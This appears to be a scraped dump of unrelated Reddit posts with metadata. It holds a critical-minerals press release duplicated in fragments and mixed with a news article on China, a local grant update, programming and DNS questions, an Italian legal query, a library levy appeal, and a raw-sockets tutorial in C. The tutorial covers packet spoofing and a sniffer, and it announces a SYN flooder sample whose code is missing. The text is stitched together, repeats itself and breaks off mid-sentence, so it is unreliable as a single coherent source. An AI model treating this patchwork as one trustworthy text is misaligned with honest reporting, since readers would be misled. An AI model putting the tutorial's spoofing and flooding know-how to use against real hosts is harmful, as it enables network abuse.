For example, the United States currently has just one operating nickel mine, the Eagle Mine in Michigan. The Eagle Mine produces a small fraction of the nation's nickel consumption and ships concentrate globally due to the absence of nickel processing in the U.S., highlighting the urgent need to develop domestic nickel sources and processing capacity. This challenge is similar for the eight other critical minerals that are hosted at Stillwater West, underscoring the need to advance the project to production to support the growing demand for minerals that are essential to both energy transition and national security.

**Federal Funding Applications and Industry Engagement**

In 2024, the Company achieved a number of important milestones to position itself for additional funding opportunities and further highlight the Company's alignment with federal priorities:

* Submission of a comprehensive white paper titled ""*Expansion of the U.S. Critical Minerals Supply Chain for Nickel, Cobalt, Platinum Group Elements, Copper and Chromium*"".
* Application for funding under [Open Announcement 24-01](https://pr.report/5wwc) from the Defense Industrial Base Consortium (""DIBC""), which focuses on bolstering domestic production of critical minerals. The Department of Defense has released this [Open Announcement through the Defense Industrial Base Consortium Other Transaction Authority](https://pr.report/5wwd) that accepted unsolicited White Papers to be considered for Defense Production Act (""DPA"") Title III and Industrial Base Analysis and Sustainment funding. As of November 2024, the Company was notified by the DIBC that the submission was under evaluation.
* Over the past four years, the DoD has invested more than US$870 million via DPA Title III to bolster North American supplies of critical minerals. Title III dates from 1950 and is separate from additional incentives for domestic production in the Inflation Reduction Act.
* Commenced work as the industry partner with Lawrence Berkeley National Laboratory with US$2 million in funding from the U.S. Department of Energy via the Advanced Research Projects Agency program (""ARPA-E""). The grant is in addition to an earlier grant from ARPA-E which was secured in collaboration with Cornell University, for total combined grant funding of US$2.75 million (see news releases August 15, 2024, and February 14, 2023).
* Continued engagement with the U.S. Geological Survey, who have been studying the Stillwater Igneous Complex for decades due to its critical mineral potential as one of the world's largest layered ultramafic complexes.
* Secured a second investment by global mining giant Glencore and strengthened the corporate team with their addition to the Company's board of directors, in addition to Glencore's continued contribution to the Stillwater West technical committee.
* Increased presence and engagement in the local community, as well as key industry organizations including the DIBC, National Mining Association, Montana Mining Association, Montana Chamber of Commerce, and Stillwater County Chamber of Commerce, among others.

Michael Rowley, President and CEO, commented, ""We are very encouraged by the positive reception and shared vision we received in our many meetings with U.S. politicians and government officials in 2024, including Senators and Congressmen from the great state of Montana. The bipartisan support we saw for critical minerals production at our neighbor Sibanye's mine complex was also very encouraging and speaks to the long and prosperous legacy of responsible mining that the Stillwater district is known for.

**About Stillwater Critical Minerals Corp.**

Stillwater Critical Minerals is a mineral exploration company focused on its flagship Stillwater West Ni-PGE-Cu-Co + Au project in the iconic and famously productive Stillwater mining district in Montana, USA. With the addition of two renowned Bushveld and Platreef geologists to the team and strategic investments by Glencore, the Company is well positioned to advance the next phase of large-scale critical mineral supply from this world-class American district, building on past production of nickel, copper, and chromium, and the on-going production of platinum group, nickel, and other metals by neighboring Sibanye-Stillwater. An expanded NI 43-101 mineral resource estimate, released January 2023, positions Stillwater West with the largest nickel resource in an active U.S. mining district as part of a compelling suite of nine minerals now listed as critical in the USA.

Stillwater also holds the high-grade Drayton-Black Lake gold project adjacent to NexGold's development-stage Goliath Gold Complex in northwest Ontario, currently under an earn-in agreement with Heritage Mining, and the Kluane PGE-Ni-Cu-Co critical minerals project on trend with Nickel Creek Platinum‘s Wellgreen deposit in Canada‘s Yukon Territory. The Company also holds the Duke Island Cu-Ni-PGE property in Alaska and maintains a back-in right on the high-grade past-producing Yankee-Dundee in BC, following its sale in 2013.

***China has a chokehold on the world’s supply of critical minerals – and experts are warning the situation is a major risk to US national security if the government doesn’t step up its efforts to compete.***

***Control over rare earth metals – which are needed to build everything from the semiconductors that power iPhones to wind turbines, electric vehicle batteries and military weaponry like tanks and missiles – have become a key point of friction and souring trade relations between the US and China.***  

***Burdensome regulations and decades of lackluster investment have left the US dangerously reliant on China – which mines up to 70% of the world’s critical minerals, controls roughly 90% of the processing capacity and regularly uses unfair trade tactics to press its advantage, sources told The Post.***

# “The fact that we are reliant on China for defense equipment is just a completely unfathomable and untenable situation,” said Pini Althaus, CEO of the New York-based firm USA Rare Earth.

If diplomatic relations get worse or an actual conflict breaks out the two countries, US lawmakers and experts fear that China, led by President Xi Jinping, could cut off the supply entirely – with disastrous consequences for the US auto industry, tech firms and the Pentagon.

“Quite frankly, they can turn off the faucet,” Althaus added.

[Rare earth metals and other critical minerals are used to build everything from smartphones to military weaponry.Los Angeles Times via Getty Images](https://preview.redd.it/2788037l6rce1.png?width=1536&format=png&auto=webp&s=2ee1856fb5fc460d3c064ff93d08daf6bab94b51)

China’s decades-long effort to corner the market is heavily subsidized by Beijing, which uses its control over the supply to manipulate prices and enacts ever-tighter export controls to cement its dominance. China has also snapped up mineral rights throughout Africa and other resource-rich locales as part of its Belt and Road Initiative – on highly favorable terms.

When the US or other rivals make progress on mining or processing a particular material, such as gallium or lithium, China often responds by flooding the market – which sends prices tumbling and kills the incentive to invest in projects, according to Rep. Rob Wittman (R-Va.), who leads the House Select Committee on China’s Critical Minerals Policy Working Group.

“They dump massive amounts of these materials on the market and they do that below the cost of production – so these companies can’t even compete,” Wittman added.

[Rep. Rob Wittman leads the House Select Committee on China’s Critical Minerals Policy Working Group.AP](https://preview.redd.it/zdph8c4o6rce1.png?width=1536&format=png&auto=webp&s=2947cf76ca6ca0cb514013ba91730ddf4101ff5d)

China has already begun to weaponize its control – in part by implementing export bans on mining and processing technology. Last month, China banned exports of three critical minerals to the US – gallium, germanium and antimony – and previously imposed restrictions on shipments of graphite.

The idea of a total embargo isn’t so far-fetched. In 2010, China briefly halted shipments of rare earth elements to Japan while the two countries were embroiled in a territorial dispute.

China has an estimated 44 million tons of rare earth reserves – or 34% of the worldwide total, according to US Geological Survey data. By comparison, the US has about 2.3 million tons of reserves.

Despite the disparity, the US “absolutely has significant deposits” of key minerals, according to Wittman, who points to sites in Minnesota, Nevada and California as well as vast untapped sources in the seabed that could be claimed.

The US began moving away from rare earth mining in the 1980s as environmental concerns gave rise to increasingly rigorous permitting and licensing rules. As businesses looked offshore for their supply needs, mining profits diminished and domestic production dwindled.

As of now, the permitting process is “still very cumbersome,” according to Barbara Arnold, a professor of mining engineering at Penn State University.

Standards are far more rigorous in the US than other countries like Canada and Australia. The process of getting a new project off the ground is costly and difficult, which has disincentivized firms from exploring for new mining sites.

“From the time that you actually locate a deposit of something to the time that you’re actually producing it, it can be 20 years. It can be 10 years just to get the permits,” said Arnold. “Those are all absolutely needed, but there should be a mechanism to get those permits through more expeditiously.”

By comparison, China imposes few environmental restrictions on its mining projects – and has built a domestic supply chain “contaminated with forced labor and environmentally degrading mining and refining practices,” according to a recent report by the select committee.

“China would be the opposite extreme, meaning there’s almost no permitting rigors whatsoever,” Althaus said.

To strengthen its supply chain outside of China, the US should aim to ramp up partnerships with Canada and Australia, according to Althaus. Resource-heavy countries in Central Asia and Africa, which have traditionally fallen under China’s sway, are another option.

[China has built a near-monopoly for key critical minerals over the last several decades.Bloomberg via Getty Images](https://preview.redd.it/es9uvg6w6rce1.png?width=1536&format=png&auto=webp&s=51584458755c1868ab420a4e5071a5c6616bcf61)

On the domestic front, US government support for early-stage exploration of criminal minerals and local processing capabilities would go a long way, he added.

Canada, for example, offers “flow-through shares” that make investments in so-called junior mining outfits tax-deductible. The smaller firms handle site exploration and assess the feasibility of a given site, then approach larger firms to bankroll operations.

Last month, Wittman and his colleagues introduced a trio of bills aimed at boosting the US critical mineral supply chain and limiting dependence on China.

The bills would authorize more funding for US collaboration with friendly nations on critical mineral supply chains; impose export controls on domestic battery and magnet materials; and set up a “Resilient Resource Reserve” that would help protect US producers from China’s price manipulation.

“We are not going to combat them in any other way other than having an alternative to what China does. And I think we can do that, and I think we can do that quickly,” Wittman said.

**VANCOUVER, BC / ACCESSWIRE / January 13, 2025 /** Stillwater Critical Minerals Corp. (TSX.V:PGE)(OTCQB:PGEZF)(FSE:J0G) (the ""Company"" or ""Stillwater"") is pleased to provide an overview and status update on its ongoing applications for additional U.S. government grant funding, highlighting its potential to play a pivotal role in strengthening domestic critical mineral supply chains.

Recognizing the increasing geopolitical risks to global supply chains of critical minerals, the U.S. government has steadily expanded its mandate to build domestic supply chains. Priority has been given to securing U.S. inventories and processing capacity for [50 critical minerals](https://pr.report/5wwa) that have been recognized as being essential to the economy and security of the USA which are currently sourced primarily from other countries. Recent federal initiatives, including the establishment of the [Strategic and Critical Materials Board of Directors](https://pr.report/5wwb) by the Department of Defense (""DoD""), demonstrate bipartisan commitment to addressing supply chain vulnerabilities for listed materials.

Stillwater is uniquely positioned to contribute significantly to U.S. supplies with a world-class inventory of critical minerals in the historically productive Stillwater Complex in Montana. The Company's flagship Stillwater West project in south-central Montana is immediately adjacent to Sibanye-Stillwater's (""Sibanye"") operating mines and processing complex. Mining and processing of critical minerals in the Stillwater district dates back to the 1880s and includes the production of chromium in the 1940s and 50s, at times with government subsidies. At present, Sibanye is the largest global producer of platinum group metals outside Russia and South Africa. Building further on the importance of the Stillwater Complex, the Stillwater West project hosts nine metals that have been listed as critical in the U.S., including the largest nickel resource in an active U.S. mining jurisdiction, along with substantial inventories of copper, cobalt, palladium, platinum, rhodium, and chromium, in addition to as yet unquantified amounts of ruthenium and iridium. As such, Stillwater West is considered by the Company to be central to the strategy of securing domestic supply of critical minerals in the USA and reducing the reliance on foreign imports of these metals.

  
For example, the United States currently has just one operating nickel mine, the Eagle Mine in Michigan. The Eagle Mine produces a small fraction of the nation's nickel consumption and ships concentrate globally due to the absence of nickel processing in the U.S., highlighting the urgent need to develop domestic nickel sources and processing capacity. This challenge is similar for the eight other critical minerals that are hosted at Stillwater West, underscoring the need to advance the project to production to support the growing demand for minerals that are essential to both energy transition and national security.

**Federal Funding Applications and Industry Engagement**

In 2024, the Company achieved a number of important milestones to position itself for additional funding opportunities and further highlight the Company's alignment with federal priorities:

* Submission of a comprehensive white paper titled ""*Expansion of the U.S. Critical Minerals Supply Chain for Nickel, Cobalt, Platinum Group Elements, Copper and Chromium*"".

* Application for funding under [Open Announcement 24-01](https://pr.report/5wwc) from the Defense Industrial Base Consortium (""DIBC""), which focuses on bolstering domestic production of critical minerals. The Department of Defense has released this [Open Announcement through the Defense Industrial Base Consortium Other Transaction Authority](https://pr.report/5wwd) that accepted unsolicited White Papers to be considered for Defense Production Act (""DPA"") Title III and Industrial Base Analysis and Sustainment funding. As of November 2024, the Company was notified by the DIBC that the submission was under evaluation.
* Over the past four years, the DoD has invested more than US$870 million via DPA Title III to bolster North American supplies of critical minerals. Title III dates from 1950 and is separate from additional incentives for domestic production in the Inflation Reduction Act.
* Commenced work as the industry partner with Lawrence Berkeley National Laboratory with US$2 million in funding from the U.S. Department of Energy via the Advanced Research Projects Agency program (""ARPA-E""). The grant is in addition to an earlier grant from ARPA-E which was secured in collaboration with Cornell University, for total combined grant funding of US$2.75 million (see news releases August 15, 2024, and February 14, 2023).
* Continued engagement with the U.S. Geological Survey, who have been studying the Stillwater Igneous Complex for decades due to its critical mineral potential as one of the world's largest layered ultramafic complexes.
* Secured a second investment by global mining giant Glencore and strengthened the corporate team with their addition to the Company's board of directors, in addition to Glencore's continued contribution to the Stillwater West technical committee.
* Increased presence and engagement in the local community, as well as key industry organizations including the DIBC, National Mining Association, Montana Mining Association, Montana Chamber of Commerce, and Stillwater County Chamber of Commerce, among others.

Michael Rowley, President and CEO, commented, ""We are very encouraged by the positive reception and shared vision we received in our many meetings with U.S. politicians and government officials in 2024, including Senators and Congressmen from the great state of Montana. The bipartisan support we saw for critical minerals production at our neighbor Sibanye's mine complex was also very encouraging and speaks to the long and prosperous legacy of responsible mining that the Stillwater district is known for. We have applied to the U.S. government for substantial grant funding to accelerate the advancement of Stillwater West to become a cornerstone of U.S. critical mineral supply as the country moves quickly to reduce its dependence on imports.""

City of Reno Gives Update on Delayed Crak N' Grill ,ourtownreno,1hyzxci,2025-01-11 11:44:30,4,0.83,6,https://www.reddit.com/r/ourtownreno/comments/1hyzxci/city_of_reno_gives_update_on_delayed_crak_n_grill/,thebrushup,,"With concerns over breakfast and lunch spot Crak N’ Grill putting up large signs last year and getting written up by media, but not yet opening at its  301 S Wells Ave location, and then receiving City of Reno matching grants both for facade and tenant improvements, we contacted the city’s media line to get an update.

We received this lengthy response from Revitalization Manager Bryan McArdle yesterday afternoon:

“Crak N' Grill is slated to open their business soon. They are currently awaiting their final Fire and Health inspections. The physical improvements to the space took longer than anticipated due to additional work needing to be done.Crak N' Grill was a ReStore awardee under both our Façade and Tenant Improvement grants. 

Crak N' Grill was awarded $14,983.00 in matching funds for Façade improvements which included replacing broken windows, fixing a leaky roof, replacing doors, and repainting the building. 

Crak N' Grill was also awarded $20,671.00 in Tenant Improvement matching funds to improve the interior space and kitchen, and repair water damage. 

The initial cost estimate to complete the work was $84,000, but they discovered that a lot of additional improvements needed to be completed to open and bring it up to code. 

Those improvements have been completed and grant funds were released last month.When it comes to the ReStore Program, it's designed to enhance the visual appeal, economic vitality, and overall livability of commercial areas of downtown.

Opening a business is not a requirement of the grant funding as the ReStore funds improve spaces for existing and future tenants. The intent of the program was intended to use the ARPA funding to revitalize downtown in partnership with businesses.

The ReStore Program is funded by grant money from the State and Local Fiscal Recovery Funds (SLFRF) under the American Rescue Plan Act (ARPA). 

These funds have specific provisions that allow for programs like Restore for façade and tenant improvements. 

The rules given by the Treasury Department state that funds can be used to support small businesses in addressing the economic impacts caused by the pandemic. The funds also support stimulating economic activity in distressed areas impacted by the pandemic by allowing investments that enhance a business’s ability to operate safely and attract customers, and projects that enhance a neighborhood’s vitality.”

"Why client sending to server blocks if server closes corresponding socket, even with `MSG_DONTWAIT`?",C_Programming,1hyvaf3,2025-01-11 07:55:13,6,1.0,10,https://www.reddit.com/r/C_Programming/comments/1hyvaf3/why_client_sending_to_server_blocks_if_server/,VegetablePrune3333,Question,"\-- It's solved. Thank you all for the help --

==============================

Tested in 64-bit Linux 6.12.6, GLIBC 2.40.

In the sample code, I use named semaphore to synchronize child and parent processes.

    server                client
    ---------------------------------------
    accept                sem_wait             
    sem_post
                          connect
    accept `clifd`        sem_wait
    close(clifd)
    sem_post
    sleep                 for(...){ send }

Output:

    open semaphore and try to zero it
    server's ready to accept new connections
    client connected, sem_wait
    server accepted client(fd=4), about to close it
    client woken up and ready to send
    client sent#1, nsent=3

First sent is ok.

Second sent blocked forever even with MSG\_DONTWAIT.

Just the reverse, if server sends to a socket (which client has closed remotely), server receives SIGPIPE.

Why the client just blocks if server closes corresponding socket, instead of receiving some kind of errors?

The manual page \`send.2\` says nothing about this case.

Sample code:

Possibile danno all’udito da rumore in ufficio,Avvocati,1hxmv2e,2025-01-09 15:48:57,0,0.27,18,https://www.reddit.com/r/Avvocati/comments/1hxmv2e/possibile_danno_alludito_da_rumore_in_ufficio/,MandehK_99,Salute,"Ciao a tutti,
Ho lavorato per un’azienda da dicembre 2019 a dicembre 2021. Tra marzo/aprile 2020 e la fine del mio contratto, mi trovavo in un ufficio con una finestra che affacciava su un balcone dell'edificio di un’azienda farmaceutica. Questo balcone ospitava delle UTA (macchine per il condizionamento aria) che erano decisamente rumorose nonostante i doppi vetri. Ogni tanto in ufficio veniva fuori il discorso e ci lamentavamo tra colleghi; anche il fratello del capo, che lavorava di fronte a me, ne era infastidito, soprattutto quando si aprivano le finestre (con la differenza che il mio orecchio destro puntava direttamente a quelle macchine) 

A novembre 2022, undici mesi dopo aver lasciato quell’ufficio, ho effettuato dei test audiometrici (audiometria tonale e impedenzometria) prescritti dall'otorinolaringoiatra. È risultato che il mio orecchio destro, quello più esposto al rumore, era ""al limite della sufficienza"", mentre il sinistro era perfettamente nella norma. 

C'è da dire che la dottoressa mi aveva fatto rifare le misurazioni per alcune frequenze all'orecchio destro pensando che avessi indossato male il padiglione della cuffia. La cosa poi si era rivelata non vera ma in quel momento a lei non venne il dubbio che potesse essere un mio problema (forse data la mia giovane età) e non mi fece altre domande, a me invece non scattò nulla in testa e non mi saltò in mente il setting dove avevo lavorato fino a un'anno prima. 

Non avevo mai avuto problemi di udito in passato. Per un periodo ho pensato che l’orecchio destro fosse semplicemente tappato, perché avvertivo una sensazione costante di ovattamento rispetto al sinistro, ma nonostante la pulizia regolare, la situazione non è mai cambiata. Questa sensazione è particolarmente evidente quando entra acqua durante la doccia o quando smuovo gli auricolari che sto indossando: lo sfregamento della gomma contro la pelle percepito dal destro mi sembra sempre ""meno forte"" rispetto al sinistro.

Dopo aver lasciato l’azienda, vengo a sapere dagli ormai ex colleghi che l’ARPA è intervenuta (tra fine 2021 e il 2024). A seguito delle rilevazioni, l’azienda farmaceutica ha dovuto installare pareti e coperture insonorizzanti.

Dato che non ho analisi uditive precedenti al mio periodo di lavoro in quell'ufficio, mi chiedo se abbia senso approfondire questa situazione, e se si possa ipotizzare un’azione risarcitoria contro l’azienda farmaceutica.
Se qualcuno di voi ha avuto esperienze simili, come vi siete mossi?

P.S.
Specifico che non sono mai stato un fruitore di musica ad alto volume se non per brevi periodi da adolescente e anche andando a concerti e festival poche volte l'anno ho sempre indossato tappi protettivi NON usa e getta"

Raw sockets in C...,u_RazPie,1hxbj11,2025-01-09 07:17:32,1,1.0,0,https://www.reddit.com/r/u_RazPie/comments/1hxbj11/raw_sockets_in_c/,RazPie,,"
In this tutorial, you'll learn the basics of using raw sockets in C, to insert any IP protocol based datagram into the network traffic. This is useful, for example, to build raw socket scanners like nmap, to spoof or to perform operations that need to send out raw sockets. Basically, you can send any packet at any time, whereas using the interface functions for your systems IP- stack (connect, write, bind, etc.) you have no direct control over the packets. This theoretically enables you to simulate the behavior of your OS's IP stack, and also to send stateless traffic (datagrams that don't belong to a valid connection). For this tutorial, all you need is a minimal knowledge of socket programming in C (see https://beej.us/guide/bgnet/html/split/).
I. Raw sockets
The basic concept of low level sockets is to send a single packet at one time, with all the protocol headers filled in by the program (instead of the kernel). Unix systems traditionally supported two types of sockets for direct network access. Previously, one was SOCK_PACKET, which interacted directly with the device link layer, meaning the NIC-specific header was included in the data that would be written or read. This typically included the ethernet header, along with all subsequent protocol headers. However, this socket type has been largely deprecated in modern systems due to security concerns. The socket type we now primarily use is SOCK_RAW, which includes the IP headers and all subsequent protocol headers and data.
The (simplified) link layer model looks like this:
Physical layer -> Device layer (Ethernet protocol) -> Network layer (IP) ->
Transport layer (TCP, UDP, ICMP) -> Session layer (application specific data)
Now to some practical stuff. A standard command to create a datagram socket is:
c
socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
From the moment a raw socket is created, it enables sending any IP packets and receiving any IP packets that the host handles post-creation, provided they match the protocol specified when the socket was created. Remember that while raw sockets serve as an interface to the IP layer, they are configured to handle specific transport layer protocols. This means, for monitoring TCP, UDP, ICMP, or capturing all IP traffic (without specifying the transport layer protocol), you must create separate raw sockets using IPPROTO_TCP, IPPROTO_UDP, IPPROTO_ICMP, and IPPROTO_IP. The protocol numbers used are 6 for TCP, 17 for UDP, 1 for ICMP, and 0 for IP which captures traffic for all protocols at the IP layer.
With this knowledge, we can, for example, already create a small sniffer, that dumps out the contents of all tcp packets we receive. (Headers, etc. are missing, this is just an example. As you see, we are skipping the IP and TCP headers which are contained in the packet, and print out the payload, the data of the session/application layer, only).
c
int fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
char buffer[8192]; /* single packets are usually not bigger than 8192 bytes */
while (read (fd, buffer, 8192) > 0)
 printf (""Caught tcp packet: %s\n"", 
  buffer+sizeof(struct iphdr)+sizeof(struct tcphdr));
The above code was all that was included in the original paper; here is a full example that compiles.
c

    }

    close(fd);

II. The protocols IP, ICMP, TCP and UDP
To inject your own packets, you need to understand the structures of the protocols involved. Below, you will find a brief introduction to the IP, ICMP, TCP, and UDP headers. It is recommended to construct your packets using predefined structs from standard header files like <netinet/ip.h>, ensuring that all protocol specifications are met. You may also define your own structs, provided they conform to the correct specifications for each protocol field. For portability, we use BSD field names in our structs, which might require specific flags or macros depending on your development environment. Remember, network protocols use big-endian (network byte order) for multi-byte fields, so you must use network byte order functions to correctly format these fields before sending packets. This approach ensures that your packets are correctly interpreted regardless of the underlying hardware architecture of the network equipment or the destination hosts. Below each header structure, a short explanation of its members will guide you on the required values and their purposes, helping you build effective and compliant network communications.
The data types/sizes we need to use are: unsigned char - 1 byte (8 bits),
unsigned short int - 2 bytes (16 bits) and unsigned int - 4 bytes (32 bits)
c
#include <netinet/in.h> /* For htonl and htons functions */

struct ipheader {
    unsigned char ip_hl:4, ip_v:4;
    unsigned char ip_tos;
    unsigned short int ip_len;
    unsigned short int ip_id;
    unsigned short int ip_off;
    unsigned char ip_ttl;
    unsigned char ip_p;
    unsigned short int ip_sum;
    unsigned int ip_src;
    unsigned int ip_dst; 
}; /* Total IP header length: 20 bytes (=160 bits) */

The Internet Protocol is the network layer protocol, used for routing the data from the source to its destination. Every datagram contains an IP header followed by a transport layer protocol such as tcp.
ip_hl: the IP header length in 32-bit words. A value of 5 means 20 bytes (5 * 4). Values other than 5 indicate that the IP header contains options (mostly used for routing).
ip_v: the IP version is always 4 for IPv4.
ip_tos: type of service has been redefined to include Differentiated Services Code Point (DSCP) and Explicit Congestion Notification (ECN). The first 6 bits are for DSCP and the last 2 bits for ECN.
ip_len: total length must contain the total length of the IP datagram, including IP header, any subsequent headers (ICMP, TCP, UDP), and payload size in bytes.
ip_id: the ID sequence number is mainly used for the reassembly of fragmented IP datagrams. Each datagram can have an arbitrary ID when sent singly.
ip_off: the fragment offset field is used for reassembly of fragmented datagrams. The first bit is reserved (must be zero), the second bit is the 'Don't Fragment (DF)' bit, and the third bit is the 'More Fragments (MF)' bit. The following 13 bits represent the fragment offset.
ip_ttl: time to live represents the number of hops (routers to pass) before the packet is discarded, potentially returning an ICMP error message. The maximum value is 255.
ip_p: the protocol field identifies the transport layer protocol (e.g., TCP is 6, UDP is 17, ICMP is 1). Refer to /etc/protocols for a complete list.
ip_sum: the checksum for the entire IP header, which must be recalculated anytime a change occurs in the header to ensure integrity.
ip_src and ip_dst: source and destination IP addresses, which must be in network byte order, are typically set using functions like inet_addr(). These addresses can be chosen arbitrarily depending on routing and addressing requirements.
IP itself has no mechanism for establishing or maintaining a connection, nor does it directly manage data payloads. It is primarily responsible for routing datagrams based on IP addresses across network boundaries. The Internet Control Messaging Protocol (ICMP), on the other hand, is an extension of IP designed to provide network diagnostic functions and error reporting. ICMP is used to communicate information about network issues, such as unreachable hosts or network segments, and to facilitate operational queries. It is commonly referred to as a protocol of the network layer, encapsulated within IP datagrams for transmission.
c
struct icmpheader {
 unsigned char icmp_type;
 unsigned char icmp_code;
 unsigned short int icmp_cksum;
 /* The following data structures are ICMP type specific */
 unsigned short int icmp_id;
 unsigned short int icmp_seq;
}; /* total icmp header length: 8 bytes (=64 bits) for echo requests/replies */
icmp_type: The message type, for example, 0 for echo reply, 8 for echo request, 3 for destination unreachable. See <netinet/ip_icmp.h> for all defined types.
icmp_code: Specifies the kind of error or sub-type of the message, significant especially when sending error messages like unreachable (type 3).
icmp_cksum: The checksum covering the whole ICMP message, calculated in the same way as the IP header checksum, ensuring integrity of the message across the network.
Note: The structure and usage of the next 32 bits (icmp_id and icmp_seq) in an ICMP packet can vary significantly depending on the icmp_type and icmp_code. The ID and sequence number structure is typical for echo requests (type 8) and replies (type 0), but other types of ICMP messages may use these fields differently or not at all.
The User Datagram Protocol is a transport protocol for sessions that need to exchange data. Both UDP and TCP provide 65535 different source and destination ports. The destination port is used to connect to a specific service. Unlike TCP, UDP does not use sequence numbers or establish reliable connections. This means UDP datagrams can be spoofed, and might be unreliable as they can be lost without notice, since they are not acknowledged with replies and sequence numbers.
c
struct udpheader {
 unsigned short int uh_sport;
 unsigned short int uh_dport;
 unsigned short int uh_len;
 unsigned short int uh_check;
}; /* total udp header length: 8 bytes (=64 bits) */
uh_sport: The source port to which a client binds, and from which the server will direct responses to the client.
uh_dport: The destination port used to contact a specific server.
uh_len: The total length of the UDP header and the payload.
uh_check: The checksum covering the header and the payload, calculated similarly to the IP checksum.
The Transmission Control Protocol is the most widely used transport protocol that provides mechanisms to establish a reliable connection, ensuring data integrity and order using sequence numbers and acknowledgments.
c
struct tcpheader {
 unsigned short int th_sport;
 unsigned short int th_dport;
 unsigned int th_seq;
 unsigned int th_ack;
 unsigned char th_x2:4, th_off:4;
 unsigned char th_flags;
 unsigned short int th_win;
 unsigned short int th_sum;
 unsigned short int th_urp;
}; /* total tcp header length: 20 bytes (=160 bits) */
th_sport: Source port, similar to UDP.
th_dport: Destination port, similar to UDP.
th_seq: Used to order TCP segments. The sequence of the first segment is random, with subsequent segments’ sequence numbers incremented by the previous segment's data length.
th_ack: Indicates the next expected byte from the sender, acknowledging receipt of prior data.
th_x2: Reserved space, must be set to zero.
th_off: Data offset, specifying the size of the TCP header in 32-bit words.
th_flags: Contains flags such as SYN (synchronize), ACK (acknowledge), FIN (finish), RST (reset), PSH (push), and URG (urgent).
th_win: Specifies the size of the sender's receive window.
th_sum: Checksum for error-checking, covering the header, payload, and a pseudo-header.
th_urp: Points to the sequence number of the byte following the urgent data.
This structure and the sequence of operations using these fields enable TCP to manage and maintain a reliable, ordered, and error-checked delivery of a stream of bytes between applications running on hosts communicating over an IP network.
III. Building and injecting datagrams
Now, by putting together the knowledge about the protocol header structures with some basic C functions, it is easy to construct and send any datagram(s). We will demonstrate this with a small sample program that constantly sends out SYN requests to one host (Syn flooder).

IV. Basic transport layer operations
To make use of raw packets, knowledge of the basic IP stack operations is essential. I'll try to give a brief introduction into the most important operations in the IP stack. To learn more about the behavior of the protocols, one option is to exame the source for your systems IP stack, which, in Linux, is located in the directory /usr/src/linux/net/ipv4/. The most important protocol, of course, is TCP, on which I will focus on.
Connection initiation: to contact an udp or tcp server listening on port 1234, the client calls a connect() with the sockaddr structure containing destination address and port. If the client did not bind() to a source port, the systems IP stack will select one it'll bind to. By connect()ing, the host sends a datagram containing the following information: IP src: client address, IP dest: servers address, TCP/UDP src: clients source port, TCP/UDP dest: port 1234. If a client is located on port 1234 on the destination host, it will"

How to replicate socks5h DNS resolution with TUN inbound on Android in sing-box?,dumbclub,1hvrvee,2025-01-07 08:52:19,2,1.0,0,https://www.reddit.com/r/dumbclub/comments/1hvrvee/how_to_replicate_socks5h_dns_resolution_with_tun/,SuspiciousIsland2682,,"I want to replicate the behavior of `curl -x socks5h://127.0.0.1:4447`, where the remote SOCKS server handles all DNS lookups (no local DNS resolution on the Android device). However, with sing-box configured for an incoming TUN, I still see local DNS queries being made. Removing the DNS config or letting everything go directly to the SOCKS outbound often triggers `SOCKS: Unsupported command: 3`, which I suspect is due to UDP handling on Android.

I’m looking for a recommended configuration (or simple example) that ensures all domain names are resolved only by the remote SOCKS server, replicating the `socks5h` behavior, and avoiding local DNS entirely.

# Reproduction

Below is an example config I tried. It creates a TUN inbound on Android and forwards traffic to a local SOCKS server on port 4447. Despite setting it up this way, local DNS queries still occur, and if I skip the DNS portion entirely, I get the `Unsupported command: 3` error on the server side.

"Fund Our Library, Parks, and Center 50+",SALEM,1huru69,2025-01-06 00:27:54,63,0.86,48,https://www.reddit.com/r/SALEM/comments/1huru69/fund_our_library_parks_and_center_50/,kittenfaces,NEWS,"The saga continues as Salem looks for a way to fund our Library, Parks, and Center 50+. I received this e-mail today and wanted to share it with all of you lovely people:


""City Council Will Decide Whether to Go Forward with A Livability Levy on January 21st

On Tuesday, January 21st the new Salem City Council will hold a work session in City Hall chambers to consider putting a Livability Levy on the May 21st ballot. This will be the new City Council with a new Mayor, Julie Hoy, and three new Councilors, Paul Tigan, Shane Matthews and Irvin Brown.

A Livability Levy would be a property tax increase, probably lasting five years, that would fund our Library, Parks and Center 50+, all of which have experienced severe budget cuts in the recent past. Further cuts to the Library were averted last year when the Council decided to use leftover ARPA funds for forestall further cuts. Fund Our Libraries has been advocating for the past year for full funding for the Library that would restore seven day a week service at the main library and five day service at the West Salem Branch with evening hours at both locations.

If the Council decides to go forward with a levy on the May ballot, a crucial question is how much to ask for and what specifically will the levy funding buy in restored services. The amount of levies is expressed in cents per $1,000 in assessed valuation of property (not real market value of property). A home with a real market value of $450,000 might only have an assessed value of $250,000 because of tax limitation measures passed into law decades ago. So a levy of 50¢ per $1,000 of assessed valuation would mean a tax increase for that homeowner of $125 per year or just over $10 a month.

A poll of likely voters that the City commissioned last fall found that only 43% of respondents would support a levy at 75¢ per $1,000 with 8% undecided. That might indicate that the levy would have to be significantly less to find favor with a majority of voters. The City has determined that the Library would need roughly $6.5 million to achieve full service. That alone would require a levy of around 45¢ per $1,000. More would be needed to restore funding for Parks and Center 50+.

Looming in the background is the dire circumstance that the City is looking at a $17.7 million shortfall in the General Fund next year. Eliminating all funding for the Library, Parks and Center+ would still leave a gap of approximately $3.7 million. That's why it is no exaggeration to say that without passage of a Livability Levy it is likely that the Library and Center 50+ would go dark next July and our parks would no longer be maintained.

That is why we must urge the Council to let voters decide in May to not only keep our libraries open come July, but to restore our libraries to the full service that Salem residents enjoyed in the past.

Here's What You Can Do to Urge the New Council
to Support a Livability Levy:

After January 13th when the new Councilors are sworn in send an email to citycouncil@cityofsalem.net and ask the Council to support a Livability Levy on the May 20th ballot that will restore service at our Library, Parks and Center 50+ and that will be sufficient to allow a return to full service at our main library and West Salem Branch. Tell them what the Library means to you and why it is so important, especially for our children to have access to books and reading programs that foster the love of reading.

Plan to attend the work session on Tuesday, January 21st at 6 pm at City Council chambers at City Hall. Because this is a work session there will be no public comment period for citizens to address the Council with their concerns. But just by being there, library supporters can show the Council that support for our library is strong and that they need to do the right thing and support a Livability Levy. We nearly filled the Council chambers with library supporters several times last year. Had we not done that the Council might not even be considering a Livability Levy this month. Let's do it again! If you came to a Council meeting last year, plan to do it again. We will have ""I Support the Salem Livability Levy"" lapel stickers for you. Please come.

